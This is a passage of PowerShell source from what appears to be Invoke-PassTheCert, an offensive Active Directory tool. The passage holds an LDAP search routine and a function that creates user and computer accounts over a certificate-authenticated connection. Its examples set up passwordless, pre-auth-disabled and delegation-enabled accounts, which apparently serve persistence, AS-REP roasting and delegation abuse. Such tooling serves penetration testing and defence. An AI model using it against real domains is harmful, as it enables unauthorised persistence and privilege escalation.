        [PSDefaultValue(Help="'Subtree' (i.e. search recursively from the given Search Base)")]
        [System.String]$SearchScope = 'Subtree',
    
        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the Properties to be returned")]
        [PSDefaultValue(Help="'*' (i.e. get all properties of the returned object(s))")]
        [System.String]$Properties = '*',
        
        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter LDAP Filter of the LDAP lookup")]
        [System.String]$LDAPFilter,
        
        [Parameter(Position=5, Mandatory=$false, HelpMessage="Enter UAC Flag(s) or Value to be filtered from the LDAP lookup")]
        [System.String]$UACFilter,
        
        [Parameter(Position=6, Mandatory=$false, HelpMessage="Enter DN to be filtered from the LDAP lookup")]
        [System.String]$DNFilter,
        
        [Parameter(Position=7, Mandatory=$false, HelpMessage="Enter GUID to be filtered from the LDAP lookup")]
        [System.String]$GUIDFilter,
        
        [Parameter(Position=8, Mandatory=$false, HelpMessage="Enter SID to be filtered from the LDAP lookup")]
        [System.String]$SIDFilter
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    # If $SearchBase isn't specified, defaults to the LDAP/S Server's Domain.
    # Such default value is defined ONLY IF $SearchBase has NOT been specifically set to $null (to look for the RootDSE).
    if (-not $SearchBase -and $SearchBase -ne $null) {
        $SearchBase = $(_Helper-GetDomainDNFromDN -DN $(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) 
    }

    switch ($SearchScope) {
        "Base"      { $SearchScope = [System.DirectoryServices.SearchScope]::Base; break; }
        "OneLevel"  { $SearchScope = [System.DirectoryServices.SearchScope]::OneLevel; break; }
        "Subtree"   { $SearchScope = [System.DirectoryServices.SearchScope]::Subtree; break; }
        Default     { $SearchScope = [System.DirectoryServices.SearchScope]::Subtree }
    }

    if ($LDAPFilter) { $MyFilter = $LDAPFilter } 
    elseif ($DNFilter) { $MyFilter = "(distinguishedName=$DNFilter)" } 
    elseif ($SIDFilter) { $MyFilter = "(objectSid=$SIDFilter)" } 
    elseif ($UACFilter) {
        # Raw Integer GUID input (e.g. 0x400000, or 514)
        if ($UACFilter.Trim() -imatch '^(0x[0-9A-Fa-f]+|^\d+)$') {
            $MyFilter = "(&(objectClass=person)(userAccountControl:1.2.840.113556.1.4.803:=$UACFilter))"
        # String GUID input (e.g. 'DONT_REQ_PREAUTH', or multiple 'NORMAL_ACCOUNT,SMARTCARD_REQUIRED')
        } elseif ($UACFilter.Trim() -imatch '^\s*([A-Za-z_]+(\s*,\s*[A-Za-z_]+)*)\s*$') {
            $MyFilter = "(&(objectClass=person)(userAccountControl:1.2.840.113556.1.4.803:=$(_Helper-GetValueOfUACFlags -UACFlags $UACFilter)))"
        } else {
            Write-Host "[!] UAC Filter '$UACFilter' Isn't Valid ! Expected Format: Raw Integer (e.g. 0x400000) Or String (e.g. 'DONT_REQ_PREAUTH', or 'NORMAL_ACCOUNT,SMARTCARD_REQUIRED')"
            return
        }
    } elseif ($GUIDFilter) {
        if ($GUIDFilter.Trim().ToUpper() -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
            $GUIDBytes = ([Guid]$GUIDFilter).ToByteArray();
            # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179
            # https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
            # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, 10th, ...
            $GuidLdapBytes = @(
                $GUIDBytes[3], $GUIDBytes[2], $GUIDBytes[1], $GUIDBytes[0],
                $GUIDBytes[5], $GUIDBytes[4],
                $GUIDBytes[7], $GUIDBytes[6]
            ) + $GUIDBytes[8..15]
            $GuidLdapFormat = ($GuidLdapBytes |%{ '\{0:X2}' -f $_ }) -join ''
            $MyFilter = "(objectGUID=$GuidLdapFormat)"
        }
        else {
            Write-Host "[!] GUID Filter '$GUIDFilter' Isn't Valid ! Expected Format: a2345678-A234-b234-B234-c23456789012. Returning $null...";
            return $null
        }
    } else {
        # Defaults to any object, when no filter is specified
        $MyFilter = '(objectClass=*)'
    }

    Write-Verbose "[*] Performing '$MyFilter' LDAP Query On Base '$SearchBase', In Scope '$SearchScope'..."


    $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest(
        $SearchBase, 
        $MyFilter, 
        $SearchScope
    );

    # If properties to request isn't NULL or '*', add the attribute to be queried.
    if (-not ([System.String]::IsNullOrEmpty($Properties)) -and $Properties -ne '*') {
        $SearchRequest.Attributes.AddRange($Properties -split ",");
    }
    
    $ResultObjects = @()

    # If we execute only '$SearchResponse = $LdapConnection.SendRequest($SearchRequest)' alone, then we may have the error 'The size limit was exceeded' if the reponse is too big
    # '$SearchRequest.SizeLimit' may be set, however, this is a CLIENT-SIDE control here, hence doesn't help :/ 
    #   https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.searchrequest.sizelimit
    #   https://www.rfc-editor.org/rfc/rfc2696.html
    #   https://www.openldap.org/doc/admin26/limits.html
    
    # The following 'do{}while()' (foreach loop excluded) trick circumvent that limit by retrieving limited LDAP Paging Control independently, to be later concatenated in our result.
    #   https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.pageresultrequestcontrol
    $PageSize = 500 # Maximum number of requested LDAP entries for the next page (set client-side, REQ)
    $Cookie = $null # Maximum number of remaining LDAP entries for the next page (set server-side, REP)

    do {
        $PageControl = New-Object System.DirectoryServices.Protocols.PageResultRequestControl($PageSize)
        $PageControl.Cookie = $Cookie

        # Consider the page control limit for this iteration
        [void]$SearchRequest.Controls.Add($PageControl) # For some reasones, the [void] mention is MANDATORY to avoid a NULL prefixed entry in the output. I guess it's because it returns a value, which must be discarded for it not to be outputed: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.directorycontrolcollection.add
        $SearchResponse = $LdapConnection.SendRequest($SearchRequest)

        # Retriving attributes from each entry in the LDAP response
        foreach ($Entry in $SearchResponse.Entries) {
            $ResultObject = [PSCustomObject]@{}
            foreach ($Attribute in $Entry.Attributes.AttributeNames) {
                # Dirty but handy way of getting the attribute's size (especially if it's an array, such as 'memberof', for a principal within multiple groups).
                #$AttributeLength = 0; $Entry.Attributes[$Attribute] |%{ $AttributeLength++ }
                $AttributeLength = $Entry.Attributes[$Attribute].Count
                # If we're dealing with single-valued attributes (i.e. attribute containing a single value only, such as 'distinguishedname', or 'cn', we'd avoid their array'ification. For instance, 'sAMAccountName' is NEVER an array. Hence, no need to make it an array, e.g. {Administrator}. Just make it a string, e.g. 'Administrator'.
                if ($AttributeLength -eq 1) {
                    $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $Entry.Attributes[$Attribute][0]
                } 
                # Otherwise, we're dealing with a multi-valued attribute, i.e. attribute that MAY contain multiple values (e.g. 'serviceprincipalname', or 'memberof').
                elseif ($AttributeLength -gt 1) {
                    $AttributeObject = @()
                    for ($i = 0; $i -lt $AttributeLength; $i++) {
                        $AttributeObject += $Entry.Attributes[$Attribute][$i]
                    }
                    # If we're dealing with a multi-valued attribute, when they're filtered with 'Select-Object', they'll likely show AN ANNOYING '...', especially if the array is too long. 
                    # An alternative to see these values is to suffix 'Select-Object' with the '|fl' pipe. But for it to correctly display the values, we join the array's values with CRLF.
                    # For instance:
                    #   serviceprincipalname    : {CIFS/DC01, LDAP/DC01}
                    # Will be conveniently shown as:
                    #   serviceprincipalname    : CIFS/DC01
                    #                             LDAP/DC01
                    # However, some very long array binaries (e.g. 'usercertificate') are not interesting to split. Hence, we'll whitelist the interesting multi-valued attributes to CRLF-split.
                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink', 'namingcontexts', 'supportedcontrol', 'supportedsaslmechanisms', 'supportedcapabilities', 'supportedldappolicies', 'certificatetemplates', 'mspki-certificate-application-policy', 'pkicriticalextensions', 'pkiextendedkeyusage', 'pkidefaultcsps')) {
                        $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $($AttributeObject -join "`r`n")
                    } else {
                        $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $AttributeObject
                    }
                }
            }
            # Sanity check to make sure the current object to add is NOT empty
            if ($ResultObject.PSObject.Properties.Count -gt 0) {
                $ResultObjects += $ResultObject
            }
        }
        
        # Get the PageResultResponseControl for the next Cookie: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c5e87db-4728-4f29-b164-01dd7d7391ea
        $PageResponse = $SearchResponse.Controls | ? { $_.Oid -eq "1.2.840.113556.1.4.319" } | Select-Object -First 1

        # Grab the remaining amount of LDAP entries to be returned in the next reponse (i.e. cookie). Otherwise, $null if no more remaining.
        if ($PageResponse) { $Cookie = $PageResponse.Cookie } 
        else { $Cookie = $null }

        # Remove old page control before the next iteration
        [void]$SearchRequest.Controls.Remove($PageControl)  # Just to be sure, we'll also add the [void] mention hereto avoid a NULL prefixed entry in the output: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.directorycontrolcollection.remove

    } while (($Cookie -ne $null -and $Cookie.Length -gt 0))

    if ($ResultObjects.Length -eq 0) {
        Write-Host "[!] No Entry Found ! Returning `$null..."
        return $null
    } else {
        # For each result object, translate attributes, if applicable.
        return $ResultObjects |%{ 
            # Translate UAC Values, if any, into UAC Flags (comma-separacted, if multiple)
            if ($_.useraccountcontrol) { $_ |Add-Member -Force -NotePropertyName 'useraccountcontrolnames' -NotePropertyValue (_Helper-GetUACFlagsOfValue $_.useraccountcontrol) }; 
            # Some attributes CANNOT be converted, as they don't hold byte data (e.g. SID of some builtin groups). Therefore, these cases (triggering conversion errors) are NOT translated, and left as is.
            try {
                # Translate ObjectSID bytes, if any, into a human-readable string
                if ($_.objectsid) { $_ |Add-Member -Force -NotePropertyName 'objectsid' -NotePropertyValue (_Helper-GetReadableValueOfBytes -Type 'objectsid' -ArrayOfBytes $_.objectsid) };
            } catch {}
            try {
                # Translate ObjectGUID bytes, if any, into a human-readable string
                if ($_.objectguid) { $_ |Add-Member -Force -NotePropertyName 'objectguid' -NotePropertyValue (_Helper-GetReadableValueOfBytes -Type 'objectguid' -ArrayOfBytes $_.objectguid) };
            } catch {}
            $_
        }
    }
}


function _CreateObject {
    
    <#

        .SYNOPSIS

            Creates an LDAP object.

            - The object MUST NOT already exist.
            - (Computers) The LDAP Connection Instance's account MUST NOT have already created an MAQ (ms-DS-MachineAccountQuota) number of computers (defaults to 10 maximum per account).
            - (Users/Computers) The `sAMAccountName` MUST be UNIQUE.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER ObjectDN

            [System.String] 
            
            The Distinguished Name of the object to create.

            - The Distinghuised Name's parts (e.g. the first CN part, or the OU part, if any) MUST be 64 characters MAXIMUM each.

            - For computers, the `dNSHostName` is `<CN>.<DOMAIN>`, where `<CN>` is the first `<CN>` of the DN, and `<DOMAIN>` is the domain name extracted from the DN. For instance, the `dNSHostName` of `CN=U2U2,OU=KindaBasedExploity,DC=X` is defined as: `U2U2.X`.

            - As opposed to the naming conventions on the DISALLOWED characters into the computers' `dNSHostName` (see RELATED LINKS), computers' `dNSHostName` (and even `sAMAccountName`) may contain: 
            -     ~!@$%^&'.(){}_
            -     <SPACE>         (if prefixed, or suffixed, or both, with something other than # or <SPACE>)
            -     #               (if prefixed with something other than # or <SPACE>).
            - In other words, it sounds that the ONLY DISALLOWED character within the `dNSHostName` are: 
            -     ,:
            -     <SPACE>         (alone) 
            -     #               (if NOT prefixed with something other than # or <SPACE>)

        .PARAMETER ObjectType

            [System.String] 
            
            The Type of the object to create (i.e. `User`, `Computer`)

        .PARAMETER NewPassword

            [System.String] 
            
            The password of the object to create (Optional).

            - Defaults to a random 16 (resp. 120) ASCII-printable string (!\`'"-$1il0O|I excluded for convenience) for users (resp. computers)
            - (Users) The password MUST match the password policy. Otherwise, an empty password MAY be set with UAC Flag 'PASSWD_NOTREQD'
            - (Computers) The default length to 120 characters has been empirically chosen after running a *kindak4tz.exe* command in the DC, where `DC01$`:`Password` contained 240 UTF-16 bytes, i.e. 120 characters.

        .PARAMETER UACFlags

            [System.String] 
            
            The UAC Flag(s) (comma-separated, if multiple) of the account to create (Optional).

            - (Users) Defaults to `NORMAL_ACCOUNT`
            - (Computers) Defaults to `WORKSTATION_TRUST_ACCOUNT`
            - (Users) Accounts CAN'T have the UAC Flag `WORKSTATION_TRUST_ACCOUNT`
            - (Computers) Accounts CAN have the UAC Flag `NORMAL_ACCOUNT` (oO)
            - (Users) Accounts MUST have the UAC Flag `NORMAL_ACCOUNT` (even if not specified within -UACFlags)
            - (Computers) Accounts CAN have the UAC Flag `WORKSTATION_TRUST_ACCOUNT` (even if not specified within -UACFlags) (oO)

        .PARAMETER sAMAccountName

            [System.String] 
            
            The `sAMAccountName` of the object to create (Required for users, Optional for computers).

            - The `sAMAccountName` MUST be 20 characters MAXIMUM
            - (Computers) Defaults to `<CN>$`, where `<CN>` is the first `CN` part of the DN (e.g. `DC137337$` if the specified DN is `CN=DC137337,CN=Computers,DC=X` (yeah... yet another DC...))

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'User' -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' -sAMAccountName 'jdoe' -NewPassword 'NewP@ssw0rd123!'

            Creates the user account `John JD. DOE` with `sAMAccountName` `jdoe` in the `Users` container of domain `X`, with UAC Flag `NORMAL_ACCOUNT` (default), and whose password is `NewP@ssw0rd123!`

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'User' -ObjectDN 'CN=⊥esT ⊥T. T$⊥,OU=UpTacky,DC=X' -sAMAccountName '⊥t$⊥'

            Creates the user account `⊥esT ⊥T. T$⊥` with `sAMAccountName` `⊥t$⊥` in the `UpTacky` Organizational Unit of domain `X`, with UAC Flag `NORMAL_ACCOUNT` (default), and whose password is a random 16 ASCII-printable string (!\`'"-$1il0O|I excluded for convenience)

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'User' -ObjectDN 'CN=Moji MC. COOKED,OU=KindaKitchy,DC=X' -sAMAccountName 'mcooked' -NewPassword 'New步ẵ̶̡̡̛͔̮̲̥͍͙̯͍͍̘̖̳̞̹͕̹̘͐́͛͝Œ@`¶wÃдΔ12²я½¡'

            Creates the user account `Moji MC. COOKED` with `sAMAccountName` `mcooked` in the `KindaKitchy` Organizational Unit of domain `X`, with UAC Flag `NORMAL_ACCOUNT` (default), and whose password is `New步ẵ̶̡̡̛͔̮̲̥͍͙̯͍͍̘̖̳̞̹͕̹̘͐́͛͝Œ@`¶wÃдΔ12²я½¡`

            - You may need to set UTF8 encoding into the console's settings to see these mojibakes
            - [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8
            - [Console]::InputEncoding = [System.Text.Encoding]::UTF8

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'User' -ObjectDN 'CN=µ££,CN=Users,DC=X' -sAMAccountName '££µ' -NewPassword '' -UACFlags 'PASSWD_NOTREQD'

            Creates the user account `µ££` with `sAMAccountName` `££µ` in the `Users` container of domain `X`, with UAC Flag `PASSWD_NOTREQD` (and forced `NORMAL_ACCOUNT`), and whose password is empty

            - It sounds impossible (?) to authenticate with created user accounts containing the 'µ' character (and/or others?) in its `sAMAccountName` (?)

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'User' -ObjectDN 'CN=Wanha WS. STEY,OU=KindaHousy,DC=X' -sAMAccountName 'wstey' -NewPassword 'NewP@ssw0rd123!' -UACFlags 'NORMAL_ACCOUNT, SCRIPT, PASSWD_NOTREQD, DONT_EXPIRE_PASSWORD'

            Creates the user account `Wanha WS. STEY` with `sAMAccountName` `wstey` in the `KindaHousy` Organizational Unit of domain `X`, with UAC Flags `NORMAL_ACCOUNT, PASSWD_NOTREQD, DONT_EXPIRE_PASSWORD` (for some reasons, WITHOUT SCRIPT), and whose password is `NewP@ssw0rd123!`  (4r3n't y4 lO0k1n' 2 P3r$1$T ?!)

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=123456789_123456789,CN=Computers,DC=X'

            Creates the computer account `123456789_123456789`, with `sAMAccountName` `123456789_123456789$` (i.e. CN $-suffixed by default, 20 chars max) in the `Computers` container of domain `X`, with UAC Flag `WORKSTATION_TRUST_ACCOUNT` (default), and whose password is a random 120 ASCII-printable string (!\`'"-$1il0O|I excluded for convenience)

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=MOJICOOKI_ED3456789_123456789_123456789_123456789_123456789_1234,OU=KindaKitchy,DC=X' -sAMAccountName 'MOJICOOKI_ED3456789_' -NewPassword 'New步ẵ̶̡̡̛͔̮̲̥͍͙̯͍͍̘̖̳̞̹͕̹̘͐́͛͝Œ@`¶wÃдΔ12²я½¡'

            Creates the computer account `MOJICOOKI_ED3456789_123456789_123456789_123456789_123456789_1234` (64 chars max), with `sAMAccountName` `MOJICOOKI_ED3456789_` (20 chars max) in the `KindaKitchy` Organizational Unit of domain `X`, with UAC Flag `WORKSTATION_TRUST_ACCOUNT` (default), and whose password is `New步ẵ̶̡̡̛͔̮̲̥͍͙̯͍͍̘̖̳̞̹͕̹̘͐́͛͝Œ@`¶wÃдΔ12²я½¡`

            - You may need to set UTF8 encoding into the console's settings to see these mojibakes
            - [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8
            - [Console]::InputEncoding = [System.Text.Encoding]::UTF8

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=_123456789_123456789_123456789_123456789_123456789_123456789_123,OU=_123456789_123456789_123456789_123456789_123456789_123456789_123,DC=X' -sAMAccountName 'AAAAABBBBBAAAAABBBBB' -NewPassword '64/20'

            Creates the computer account `_123456789_123456789_123456789_123456789_123456789_123456789_123` (64 chars max), with `sAMAccountName` `AAAAABBBBBAAAAABBBBB` (20 chars max) in the `_123456789_123456789_123456789_123456789_123456789_123456789_123` (64 chars max) Organizational Unit of domain `X`, with UAC Flag `WORKSTATION_TRUST_ACCOUNT` (default), and whose password is `64/20`

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=µ$,CN=Computers,DC=X' -UACFlags 'DONT_REQ_PREAUTH' -NewPassword ''

            Creates the computer account `µ$`, with `sAMAccountName` `µ$$` (i.e. CN $-suffixed by default) in the `Computers` container of domain `X`, with UAC Flags `DONT_REQ_PREAUTH` (and forced `WORKSTATION_TRUST_ACCOUNT`), and whose password is empty (4r3n't y4 lO0k1n' 2 4$R3Pr0$sT ?!)

            - It sounds impossible (?) to authenticate with created computer accounts containing the `µ` character (and/or others?) in its `sAMAccountName` (?)

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=~!@$%^&''.(){}_ #,CN=Computers,DC=X' -NewPassword '¿NÂ©wP@sswrd123¡'

            Creates the computer account `~!@$%^&'.(){}_ #` with `sAMAccountName` `~!@$%^&'.(){}_ #$` (i.e. CN $-suffixed by default) in the `Computers` container of domain `X`, with UAC Flag `WORKSTATION_TRUST_ACCOUNT` (default), and whose password is `¿NÂ©wP@sswrd123¡`

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=Wanha BE. EUSR,CN=Users,DC=X' -sAMAccountName 'weusr$' -UACFlags 'NORMAL_ACCOUNT' -NewPassword '?NÂ©wP@sswrd123!'

            Creates the computer account `Wanha BE. EUSR` with `sAMAccountName` `weusr$` in the `Users` container of domain `X`, with UAC Flag `NORMAL_ACCOUNT` (oO), and whose password is `?NÂ©wP@sswrd123!`

        .EXAMPLE

            _CreateObject -LdapConnection $LdapConnection -ObjectType 'Computer' -ObjectDN 'CN=WANHADELEG,OU=KindaDelegaty,DC=X' -UACFlags 'WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION' -NewPassword 'NewP@ssw0rd123!'

            Creates the computer account `WANHADELEG` with `sAMAccountName` `WANHADELEG$` (i.e. CN $-suffixed by default) in the `KindaDelegaty` Organizational Unit of domain `X`, with UAC Flags `WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION`, and whose password is `NewP@ssw0rd123!` (4r3n't y4 lO0k1n' 4 C0$tR41n3d D31eG4t10n ?!)

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.addrequest

        .LINK 

            https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccountname

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/ad/naming-properties

        .LINK 

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/naming-conventions-for-computer-domain-site-ou

        .LINK 

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties (UAC Flags)

        .LINK

            https://adsecurity.org/?p=280
        
        .LINK
        
            https://en.wikipedia.org/wiki/Mojibake

        .LINK 

            https://hy2k.dev/en/blog/2025/11-20-fix-powershell-mojibake-on-windows/

        .LINK 

            https://zalgo.org/

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the Type of the object to create (i.e. 'User', or 'Computer')")]
        [ValidateSet('User', 'Computer')]
        [System.String]$ObjectType,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the Distinguished Name of the object to create")]
        [System.String]$ObjectDN,

        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple) (if applicable)")]
        $UACFlags,

        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the sAMAccountName of the object to create (if applicable)")]
        [System.String]$sAMAccountName,

        [Parameter(Position=5, Mandatory=$false, HelpMessage="Enter the password of the object to create (if applicable)")]
        # Not setting its type [System.String] allows to differentiate '' and $null
        # If we use [System.String]$NewPassword, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user wanna create a new computer with a default 120 chars password (i.e. unspecified), or an empty password (i.e. set to '')
        $NewPassword
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
    
    # (?) Only users, or computers (?)...
    $AccountTypes = @('User', 'Computer')

    # Password Stuff
    # (?)... can have a Password (?)...
    if ($ObjectType -in $AccountTypes) {
        # If the '-NewPassword' parameter is specifically set to '' by the user, then it means we want an empty password.
        if ($NewPassword -eq '') { 
            $Passwordless = $true; 
            $PasswordString = "And Passwordless" 
        } else {
            # Otherwise, it's either unset (hence using the default value), or set by the user.
            if ($NewPassword -eq $null -and $ObjectType -eq 'User') { $NewPassword = $(_Helper-GetRandomString -Length 16 -Charset 'abcdefghjkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ23456789~@#%^&*()_+={}][,./?;:<>') }
            elseif ($NewPassword -eq $null -and $ObjectType -eq 'Computer') { $NewPassword = $(_Helper-GetRandomString -Length 120 -Charset 'abcdefghjkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ23456789~@#%^&*()_+={}][,./?;:<>') }
            $Passwordless = $false;
            $PasswordString = "And With Password: $NewPassword"
        }
    }
    # (?) Otherwise, the object has no password attribute (?)
    else { $Passwordless = $true; $PasswordString = "And With NO Password Attribute"; }

    # UAC Stuff
    # UAC Flags provided by the user
    if ($UACFlags) { $UACString = "With UAC Flag(s) '$UACFlags'"; }
    # (?)... Or can have UAC Flag(s) (?)...
    elseif ($ObjectType -in $AccountTypes) {
        # Otherwise, use typical default UAC Flag(s) for accounts: https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties#useraccountcontrol-values
        if ($ObjectType -eq 'Computer') { $UACFlags = 'WORKSTATION_TRUST_ACCOUNT'; $UACString = "With UAC Flag(s) '$UACFlags'"; }
        elseif ($ObjectType -eq 'User') { $UACFlags = 'NORMAL_ACCOUNT'; $UACString = "With UAC Flag(s) '$UACFlags'" }
    }
    else { $UACString = "With NO UAC Flag Attribute" }

    Write-Verbose "[*] Creating Object Of Type '$ObjectType' With Distinguished Name '$ObjectDN', $UACString, $PasswordString"

    $AddRequest = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest

    # sAMAccountName is mandatory for users...
    if ($ObjectType -eq 'User' -and -not $sAMAccountName) {
        return "[!] sAMAccountName Is Required For Users !"
    }
    # ...And $-suffixed from CN for computers by default
    elseif ($ObjectType -eq 'Computer' -and -not $sAMAccountName) {
        $sAMAccountName = "$(_Helper-GetCNFromDN -DN $ObjectDN)$"
    }

    # Attributes specific to accounts
    # (?)... Or can have the following attributes (?)...
    if ($ObjectType -in $AccountTypes) {
        Write-Verbose "[*] Trying To Add Attribute DistinguishedName '$ObjectDN' Into The Object Of Type '$ObjectType'...";
        $AddRequest.DistinguishedName = $ObjectDN;        
        Write-Verbose "[+] Successfully Added Attribute DistinguishedName '$ObjectDN' Into The Object Of Type '$ObjectType' !";

        Write-Verbose "[*] Trying To Add Attribute objectClass '$ObjectType' Into The Object Of Type '$ObjectType'...";
        $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList 'objectClass', "$ObjectType")) |Out-Null;
        Write-Verbose "[+] Successfully Added Attribute objectClass '$ObjectType' Into The Object Of Type '$ObjectType' !";
        
        Write-Verbose "[*] Trying To Add Attribute sAMAccountName '$sAMAccountName' Into The Object Of Type '$ObjectType'...";
        $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList 'sAMAccountName', "$sAMAccountName")) |Out-Null;
        Write-Verbose "[+] Successfully Added Attribute sAMAccountName '$sAMAccountName' Into The Object Of Type '$ObjectType' !";
        
        Write-Verbose "[*] Trying To Add Attribute userAccountControl '$UACFlags' Into The Object Of Type '$ObjectType'...";
        $UACValue = $(_Helper-GetValueOfUACFlags -UACFlags $UACFlags)
        $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList 'userAccountControl', "$UACValue")) |Out-Null;
        Write-Verbose "[+] Successfully Added Attribute userAccountControl '$UACValue' Into The Object Of Type '$ObjectType' !";

        if (-not $Passwordless) {
            Write-Verbose "[*] Trying To Add Attribute unicodePwd Into The Object Associated With Password: $NewPassword";
            $UnicodePwd = [byte[]][System.Text.Encoding]::Unicode.GetBytes("`"$NewPassword`"")
            $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList 'unicodePwd', $UnicodePwd)) |Out-Null;
            Write-Verbose "[+] Successfully Added Attribute unicodePwd Into The Object Associated With Password: $NewPassword";
        }
    }
    
    # Attributes specific to computers
    if ($ObjectType -eq 'Computer') {
        $Domain = _Helper-GetDomainNameFromDN -DN $ObjectDN;
        $ComputerHostname = _Helper-GetCNFromDN -DN $ObjectDN;
        $SPNs = @("HOST/$ComputerHostname", "HOST/$ComputerHostname.$Domain", "RestrictedKrbHost/$ComputerHostname", "RestrictedKrbHost/$ComputerHostname.$Domain");

        Write-Verbose "[*] Trying To Add Attribute dNSHostName '$ComputerHostname.$Domain' Into The Object Of Type '$ObjectType'...";
        $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList 'dNSHostName', "$ComputerHostname.$Domain")) |Out-Null;
        Write-Verbose "[+] Successfully Added Attribute dNSHostName '$ComputerHostname.$Domain' Into The Object Of Type '$ObjectType' !";
        
        Write-Verbose "[*] Trying To Add Attribute ServicePrincipalName '$SPNs' Into The Object Of Type '$ObjectType'...";
        $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList 'ServicePrincipalName', $SPNs)) |Out-Null;
        Write-Verbose "[+] Successfully Added Attribute ServicePrincipalName '$SPNs' Into The Object Of Type '$ObjectType' !";
    }

    $LdapConnection.SendRequest($AddRequest) |Out-Null;

    # (?)... Or can have a sAMAccountName (?)...
    if ($ObjectType -in $AccountTypes) {
        Write-Host "[+] Successfully Created Object Of Type '$ObjectType' With Distinguished Name '$ObjectDN', With sAMAccountName '$sAMAccountName', $UACString, $PasswordString";
    } else{
        Write-Host "[+] Successfully Created Object Of Type '$ObjectType' With Distinguished Name '$ObjectDN', $UACString, $PasswordString";
    }

    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope 'Base'
    "
}


function _DeleteObject {
    
